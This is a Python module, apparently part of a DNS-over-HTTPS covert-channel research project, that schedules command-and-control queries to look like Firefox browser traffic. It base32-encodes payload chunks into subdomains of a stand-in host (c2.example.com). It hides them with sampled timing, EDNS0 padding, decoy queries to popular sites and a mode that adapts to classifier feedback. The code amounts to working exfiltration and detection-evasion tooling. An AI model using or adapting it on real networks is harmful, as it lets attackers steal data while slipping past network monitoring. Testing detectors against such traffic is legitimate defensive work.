"""
Traffic Shaper — Adversarial Flow Mimicry Engine
=================================================
Reads a benign fingerprint (from CIRA-CIC analysis) and produces
timing/sizing schedules that make C2 flows statistically indistinguishable
from legitimate browser DoH traffic.

This is the adversarial core. The shaper answers:
  "Given that I have X bytes of C2 data to exfiltrate,
   how do I schedule and size my queries to look like Firefox?"
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import numpy as np
import json
import time
import random
import math
from dataclasses import dataclass, field
from typing import List, Optional, Tuple
from enum import Enum


class EvasionStrategy(Enum):
    """
    Available strategies, ordered by sophistication.
    Start with TIMING_ONLY, escalate as needed.
    """
    NAIVE           = "naive"          # No evasion (baseline — gets caught)
    TIMING_ONLY     = "timing_only"    # Fix beacon interval only
    SIZE_MIMICRY    = "size_mimicry"   # Pad/split payloads to match size dist
    COVER_TRAFFIC   = "cover_traffic"  # Inject decoy queries
    FULL_MIMICRY    = "full_mimicry"   # Timing + size + cover + jitter
    ADAPTIVE        = "adaptive"       # Dynamically reacts to classifier feedback


@dataclass
class QuerySchedule:
    """A single scheduled DoH query with its evasion parameters."""
    delay_ms:       float           # Wait this long before sending
    payload_bytes:  int             # Target encoded payload size
    padding_bytes:  int             # EDNS0 padding to add
    is_cover:       bool = False    # Decoy query (no real C2 data)
    domain:         str  = ""       # Query domain
    dns_type:       int  = 1        # A=1, AAAA=28, TXT=16, CNAME=5


@dataclass
class FlowProfile:
    """Statistical profile of a flow session."""
    total_queries:      int
    total_bytes_sent:   int
    total_bytes_recv:   int
    duration_ms:        float
    mean_iat_ms:        float
    std_iat_ms:         float
    mean_query_size:    float
    mean_response_size: float


class TrafficShaper:
    """
    Generates query schedules that mimic a provided benign fingerprint.

    Usage:
        shaper = TrafficShaper("benign_fingerprint.json")
        schedule = shaper.build_schedule(
            c2_payload=my_data,
            strategy=EvasionStrategy.FULL_MIMICRY
        )
        for q in schedule:
            time.sleep(q.delay_ms / 1000)
            send_doh_query(q)
    """

    def __init__(self, fingerprint_path: Optional[str] = None):
        if fingerprint_path:
            with open(fingerprint_path) as f:
                self.fp = json.load(f)
            print(f"[+] Loaded fingerprint: {len(self.fp)} features")
        else:
            # Use hardcoded synthetic fingerprint
            from cira_cic_analyzer import get_synthetic_benign_fingerprint
            self.fp = get_synthetic_benign_fingerprint()
            print("[*] Using synthetic fingerprint")

        self._rng = np.random.default_rng(seed=None)  # Fresh seed each run

    # ── Sampling helpers ──────────────────────────────────────────────────────

    def _sample_feature(self, feature: str, clip: bool = True) -> float:
        """Sample a value from a feature's distribution."""
        if feature not in self.fp:
            return 0.0
        d = self.fp[feature]
        # Use truncated normal to stay within realistic bounds
        val = self._rng.normal(d["mean"], d["std"])
        if clip:
            val = np.clip(val, d.get("p5", d["min"]), d.get("p95", d["max"]))
        return max(0.0, float(val))

    def _sample_iat_ms(self) -> float:
        """
        Inter-arrival time between queries.
        Real browser DoH is bursty: short pauses within a page load,
        then long idle gaps between page loads.
        """
        # Mix of burst (short IAT) and idle (long IAT) — bimodal
        if self._rng.random() < 0.7:
            # Burst phase: queries within a page load
            iat = abs(self._rng.exponential(scale=180))   # ~180ms average
            iat = np.clip(iat, 10, 2000)
        else:
            # Idle phase: waiting between page loads
            iat = abs(self._rng.exponential(scale=4500))  # ~4.5s average
            iat = np.clip(iat, 500, 30000)
        return float(iat)

    def _sample_query_size(self) -> int:
        """Query packet size matching benign distribution."""
        mean = self.fp.get("PacketLengthMean", {}).get("mean", 387)
        std  = self.fp.get("PacketLengthStandardDeviation", {}).get("mean", 189)
        size = int(self._rng.normal(mean, std * 0.4))
        return max(40, min(1500, size))

    def _sample_response_size(self) -> int:
        """Response packet size."""
        # Responses are usually larger than queries
        base = self._sample_query_size()
        return int(base * self._rng.uniform(1.1, 3.5))

    def _sample_duration_ms(self) -> float:
        """Total flow duration."""
        return float(self._sample_feature("Duration"))

    # ── Core schedule builders ─────────────────────────────────────────────────

    def build_schedule(
        self,
        c2_payload: bytes,
        strategy:   EvasionStrategy = EvasionStrategy.FULL_MIMICRY,
        chunk_size: int = 50,           # Max real data bytes per query
        cover_ratio: float = 0.3,       # Fraction of queries that are decoys
    ) -> List[QuerySchedule]:
        """
        Main entry point.
        Returns an ordered list of QuerySchedule objects to execute.
        """
        print(f"\n[*] Building schedule — strategy: {strategy.value}")
        print(f"[*] Payload: {len(c2_payload)} bytes → chunked into {math.ceil(len(c2_payload)/chunk_size)} queries")

        if strategy == EvasionStrategy.NAIVE:
            return self._naive_schedule(c2_payload, chunk_size)
        elif strategy == EvasionStrategy.TIMING_ONLY:
            return self._timing_schedule(c2_payload, chunk_size)
        elif strategy == EvasionStrategy.SIZE_MIMICRY:
            return self._size_mimicry_schedule(c2_payload, chunk_size)
        elif strategy == EvasionStrategy.COVER_TRAFFIC:
            return self._cover_traffic_schedule(c2_payload, chunk_size, cover_ratio)
        elif strategy == EvasionStrategy.FULL_MIMICRY:
            return self._full_mimicry_schedule(c2_payload, chunk_size, cover_ratio)
        elif strategy == EvasionStrategy.ADAPTIVE:
            return self._adaptive_schedule(c2_payload, chunk_size, cover_ratio)
        else:
            raise ValueError(f"Unknown strategy: {strategy}")

    def _naive_schedule(self, payload: bytes, chunk_size: int) -> List[QuerySchedule]:
        """Baseline: fixed 5s beacon, no size shaping. Will be caught."""
        chunks = self._chunk_payload(payload, chunk_size)
        return [
            QuerySchedule(
                delay_ms=5000,          # Fixed beacon — trivially detected
                payload_bytes=len(c),
                padding_bytes=0,
                domain=self._encode_as_domain(c),
                dns_type=1,
            )
            for c in chunks
        ]

    def _timing_schedule(self, payload: bytes, chunk_size: int) -> List[QuerySchedule]:
        """Only fix the timing — still detectable by size."""
        chunks = self._chunk_payload(payload, chunk_size)
        return [
            QuerySchedule(
                delay_ms=self._sample_iat_ms(),
                payload_bytes=len(c),
                padding_bytes=0,
                domain=self._encode_as_domain(c),
                dns_type=1,
            )
            for c in chunks
        ]

    def _size_mimicry_schedule(self, payload: bytes, chunk_size: int) -> List[QuerySchedule]:
        """Fix timing + pad queries to match benign size distribution."""
        chunks = self._chunk_payload(payload, chunk_size)
        schedule = []
        for c in chunks:
            target_size = self._sample_query_size()
            actual_size = len(c) + 40  # ~40 bytes DNS/DoH overhead
            padding = max(0, target_size - actual_size)
            schedule.append(QuerySchedule(
                delay_ms=self._sample_iat_ms(),
                payload_bytes=len(c),
                padding_bytes=padding,
                domain=self._encode_as_domain(c),
                dns_type=1,
            ))
        return schedule

    def _cover_traffic_schedule(
        self,
        payload:     bytes,
        chunk_size:  int,
        cover_ratio: float,
    ) -> List[QuerySchedule]:
        """Interleave real C2 queries with decoy queries for real domains."""
        real_queries = self._size_mimicry_schedule(payload, chunk_size)
        n_cover = int(len(real_queries) * cover_ratio / (1 - cover_ratio))
        cover_queries = self._generate_cover_queries(n_cover)

        combined = real_queries + cover_queries
        self._rng.shuffle(combined)

        # Re-assign delays to maintain realistic IAT across merged stream
        for q in combined:
            q.delay_ms = self._sample_iat_ms()

        return combined

    def _full_mimicry_schedule(
        self,
        payload:     bytes,
        chunk_size:  int,
        cover_ratio: float,
    ) -> List[QuerySchedule]:
        """
        Full attack:
          - Randomized IAT matching benign bimodal distribution
          - EDNS0 padding to target size distribution
          - Cover traffic injection
          - Randomized DNS query types (not just A records)
          - Occasional burst patterns (simulate page loads)
        """
        chunks = self._chunk_payload(payload, chunk_size)
        schedule = []

        # Build "page load" groups to mimic burst behavior
        groups = self._group_into_page_loads(chunks)

        for group in groups:
            # Short IATs within a page load burst
            for c in group:
                target_size = self._sample_query_size()
                actual_size = len(c) + 40
                padding = max(0, target_size - actual_size)
                schedule.append(QuerySchedule(
                    delay_ms=abs(self._rng.normal(180, 60)),  # ~180ms intra-burst
                    payload_bytes=len(c),
                    padding_bytes=padding,
                    domain=self._encode_as_domain(c),
                    dns_type=self._sample_dns_type(),
                ))
                # Occasionally insert cover query mid-burst
                if self._rng.random() < cover_ratio / 2:
                    schedule.extend(self._generate_cover_queries(1))

            # Long IAT between page loads
            if schedule:
                schedule[-1].delay_ms = self._rng.exponential(scale=4500)

        # Sprinkle remaining cover traffic
        n_cover = int(len(schedule) * cover_ratio)
        cover = self._generate_cover_queries(n_cover)
        # Insert at random positions
        for cq in cover:
            pos = self._rng.integers(0, len(schedule))
            schedule.insert(int(pos), cq)

        print(f"[+] Full mimicry schedule: {len(schedule)} total queries "
              f"({len(chunks)} real, {len(schedule)-len(chunks)} cover)")
        return schedule

    def _adaptive_schedule(
        self,
        payload:     bytes,
        chunk_size:  int,
        cover_ratio: float,
    ) -> List[QuerySchedule]:
        """
        Adaptive schedule: starts with full mimicry, but designed to
        accept feedback from the classifier and adjust parameters.
        Call update_strategy() with classifier results to adapt.
        """
        # Start with full mimicry; adaptation happens via update_strategy()
        return self._full_mimicry_schedule(payload, chunk_size, cover_ratio)

    def update_strategy(self, feedback: dict):
        """
        Receive classifier feedback and adjust shaping parameters.

        feedback = {
            "detected_rate": 0.42,          # fraction of flows detected
            "top_leaking_feature": "ResponseTimeTimeVariance",
            "leaking_feature_delta": 0.68,  # KS statistic
        }
        """
        dr = feedback.get("detected_rate", 0)
        feat = feedback.get("top_leaking_feature", "")

        print(f"\n[ADAPTIVE] Detection rate: {dr:.1%} | Leaking feature: {feat}")

        if dr > 0.5 and feat in self.fp:
            # Tighten sampling around this feature's benign mean
            self.fp[feat]["std"] *= 0.5
            print(f"[ADAPTIVE] Tightened {feat} std → {self.fp[feat]['std']:.2f}")

        if dr > 0.8:
            print("[ADAPTIVE] High detection. Increasing cover ratio recommendation.")

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _chunk_payload(self, payload: bytes, chunk_size: int) -> List[bytes]:
        return [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]

    def _group_into_page_loads(self, chunks: List[bytes]) -> List[List[bytes]]:
        """Split chunks into groups mimicking DNS queries per page load (3-12 queries)."""
        groups = []
        i = 0
        while i < len(chunks):
            group_size = int(self._rng.integers(3, 13))
            groups.append(chunks[i:i+group_size])
            i += group_size
        return groups

    def _generate_cover_queries(self, n: int) -> List[QuerySchedule]:
        """Generate n decoy queries for real-looking domains."""
        alexa_domains = [
            "google.com", "cloudflare.com", "microsoft.com", "github.com",
            "stackoverflow.com", "reddit.com", "wikipedia.org", "amazon.com",
            "youtube.com", "twitter.com", "linkedin.com", "apple.com",
            "mozilla.org", "akamai.com", "fastly.net", "cdn.net",
        ]
        queries = []
        for _ in range(n):
            domain = self._rng.choice(alexa_domains)
            target_size = self._sample_query_size()
            queries.append(QuerySchedule(
                delay_ms=self._sample_iat_ms(),
                payload_bytes=0,
                padding_bytes=max(0, target_size - 60),
                is_cover=True,
                domain=domain,
                dns_type=self._sample_dns_type(),
            ))
        return queries

    def _sample_dns_type(self) -> int:
        """Sample DNS query type matching benign browser distribution."""
        # Browsers mostly query A and AAAA
        return int(self._rng.choice([1, 28, 1, 1, 28, 5], p=[0.45, 0.35, 0.08, 0.05, 0.05, 0.02]))

    def _encode_as_domain(self, data: bytes) -> str:
        """
        Base32-encode data as a subdomain label.
        Base32 uses only A-Z and 2-7, valid in DNS labels.
        Splits into ≤63-char labels separated by dots.
        """
        import base64
        encoded = base64.b32encode(data).decode().rstrip("=").lower()
        labels = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        # Prepend a random looking prefix to avoid prefix pattern detection
        prefix = "".join(self._rng.choice(list("abcdefghijklmnopqrstuvwxyz"), size=6))
        return f"{prefix}.{''.join(l+'.' for l in labels)}c2.example.com"

    def summarize_schedule(self, schedule: List[QuerySchedule]) -> FlowProfile:
        """Compute flow-level statistics of the generated schedule."""
        real = [q for q in schedule if not q.is_cover]
        delays = [q.delay_ms for q in schedule]
        sizes = [q.payload_bytes + q.padding_bytes + 40 for q in schedule]

        return FlowProfile(
            total_queries=len(schedule),
            total_bytes_sent=sum(sizes),
            total_bytes_recv=sum(int(s * self._rng.uniform(1.1, 3.5)) for s in sizes),
            duration_ms=sum(delays),
            mean_iat_ms=float(np.mean(delays)),
            std_iat_ms=float(np.std(delays)),
            mean_query_size=float(np.mean(sizes)),
            mean_response_size=float(np.mean(sizes) * 2.1),
        )


if __name__ == "__main__":
    # Demo: shape a 512-byte C2 payload using full mimicry
    shaper = TrafficShaper()   # uses synthetic fingerprint

    dummy_payload = b"EXFIL:" + b"A" * 506  # pretend C2 data

    for strategy in EvasionStrategy:
        schedule = shaper.build_schedule(dummy_payload, strategy=strategy, chunk_size=50)
        profile = shaper.summarize_schedule(schedule)
        print(f"\n── {strategy.value} ──")
        print(f"   Queries:       {profile.total_queries}")
        print(f"   Duration:      {profile.duration_ms/1000:.1f}s")
        print(f"   Mean IAT:      {profile.mean_iat_ms:.0f}ms ± {profile.std_iat_ms:.0f}ms")
        print(f"   Mean size:     {profile.mean_query_size:.0f}B")
